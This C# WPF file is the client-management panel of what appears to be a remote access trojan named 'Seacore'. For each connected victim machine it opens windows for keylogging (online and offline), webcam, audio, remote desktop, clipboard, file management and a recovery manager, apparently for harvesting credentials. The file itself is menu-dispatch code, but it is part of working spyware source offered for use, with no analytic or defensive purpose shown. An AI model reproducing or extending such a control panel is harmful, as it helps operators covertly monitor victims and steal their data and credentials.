using Seacore.Resources.Usercontrols.Clients.Windows.Control.Keylogger.Online;
using Seacore.Resources.Usercontrols.Clients.Windows.Management.FileManager;
using Seacore.Resources.Usercontrols.Clients.Windows.Control.RemoteDesktop;
using Seacore.Resources.Usercontrols.Clients.Windows.Control.AudioControl;
using Seacore.Resources.Usercontrols.Clients.Windows.Control.Keylogger;
using Seacore.Resources.Usercontrols.Clients.Windows.Control.Webcam;
using Seacore.Resources.Usercontrols.Clients.Windows.Management;
using Seacore.Resources.Usercontrols.Clients.Windows.Recovery;
using Seacore.Resources.Usercontrols.Clients.Windows.Options;
using Seacore.Resources.Usercontrols.Clients;
using System.Windows.Controls;
using Seacore.Resources.Core;
using System.Windows;
using Serilog;

namespace Seacore.Resources.Usercontrols
{
    public partial class Client : UserControl
    {
        public Client()
        {
            InitializeComponent();
            Loaded += Client_Loaded;
            DataContext = TcpConnectionManager.Instance;
        }

        private void Client_Loaded(object sender, RoutedEventArgs e)
        {
            clientsListView.ItemsSource = TcpConnectionManager.Instance.ConnectedClients;
        }

        private void HandleClientAction(object sender, RoutedEventArgs e, string action)
        {
            if (clientsListView.SelectedItem is ClientInfo clientInfo && clientInfo.TcpClient.Connected)
            {
                switch (action)
                {
                    case "Reconnect":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        TcpConnectionManager.Instance.ReconnectClient(clientInfo);
                        break;
                    case "Disconnect":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        TcpConnectionManager.Instance.DisconnectClient(clientInfo);
                        break;
                    case "RecoveryManager":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new RecoveryWindow(clientInfo).Show();
                        break;
                    case "Options":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new OptionsWindow().Show();
                        break;
                    case "Clipboard":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new ClipboardManagerWindow().Show();
                        break;
                    case "RemoteDesktop":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new RemoteDesktopWindow().Show();
                        break;
                    case "Webcam":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new WebcamWindow().Show();
                        break;
                    case "FileManager":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new FileManagerWindow().Show();
                        break;
                    case "KeyloggerOnline":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new KeyloggerOnlineWindow().Show();
                        break;
                    case "KeyloggerOffline":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new KeyloggerOfflineWindow().Show();
                        break;
                    case "Audio":
                        Log.Information("Action '{Action}' triggered for client {ClientEndPoint}", action, clientInfo.TcpClient.Client.RemoteEndPoint);
                        new AudioControlWindow().Show();
                        break;
                }
            }
            else
            {
                Log.Warning("No client selected or client is not connected.");
            }
        }

        private void ReconnectBTN_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Reconnect");
        private void DisconnectBTN_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Disconnect");
        private void RecoveryManagerMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "RecoveryManager");
        private void OptionsMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Options");
        private void ClipboardMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Clipboard");
        private void RemoteDesktopMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "RemoteDesktop");
        private void WebcamMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Webcam");
        private void FileManagerMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "FileManager");
        private void KeyloggerOnlineMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "KeyloggerOnline");
        private void KeyloggerOfflineMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "KeyloggerOffline");
        private void AudioMenuItem_Click(object sender, RoutedEventArgs e) => HandleClientAction(sender, e, "Audio");
    }
}